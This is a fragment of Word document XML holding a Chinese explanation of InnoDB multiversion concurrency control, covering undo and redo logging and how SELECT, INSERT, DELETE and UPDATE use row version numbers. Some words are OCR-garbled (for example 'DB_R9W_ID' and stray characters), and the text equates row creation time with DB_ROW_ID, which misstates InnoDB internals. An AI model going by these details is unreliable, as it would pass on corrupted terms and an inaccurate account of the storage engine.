        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="310" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>具体的执行过程</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="310" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>begin-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>＞用排他锁锁定该行-＞记录</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>redo log-＞</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>记录</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>undo log-＞</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>修改当前行的值，写事务 编号，回滚指针指向</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>undo log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中的修改前的行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="310" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">上述过程确切地说是描述了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>UPDATE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的事务过程，其实</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>undo log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>分</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>insert</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">update undo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>皿，因为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>insert</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>原始的数据并不存在，所以回滚时把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>insert undo log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>丢弃即可, 而</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>update undo log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>则必须遵守上述过程</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="310" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>下面分别以</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>select、delete、insert</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="subscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> update</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>语句来说明</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="310" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>SELECT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="320" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Innodb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>检查每行数据，确保他们符合两个标准：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="765"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="320" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="91" w:name="bookmark100"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:bookmarkEnd w:id="91"/>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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>InnoDB</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>只查找版本早于当前事务版本的数据行（也就是数据行的版本必须小于等于 事务的版本），这确保当前事务读取的行都是事务之前己经存在的，或者是由当前事务 创建或修改的行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="765"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="320" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="92" w:name="bookmark101"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:bookmarkEnd w:id="92"/>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行的删除操作的版本一定是未定义的或者大于当前事务的版本号，确定了当前事务 开始之前，行没有被删除</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="320" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>符合了以上两点则返回查询结果。</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INSERT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="320" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>InnoDB</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>为每个新増行记录当前系统版本号作为创建</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ID。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="320" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>DELETE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>InnoDB</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>为每个删除行的记录当前系统版本号作为行的删除</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ID。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:pBdr>
          <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>UPDATE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>InnoDB</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>复制了一行。这个新行的版本号使用了系统版本号。它也把系统版本号作为了 删除行的版本。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>说明</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>insert</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">操作时“创建时间” </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>=DB_ROW_ID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>，这时，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>“删除</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>时间”是未定义的；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>update B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">寸，复制新増行的“创建时间” </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>=DB_ROW_ID,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>删除时间未定义，旧数据行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">“创 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>建时间</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>”不</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>变，删除时间=该事务的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>DB_R9W_ID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="subscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>delete</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>操作，相应数据行的“创建时间”不变，删除时间=该事务的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>DB_ROW_ID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
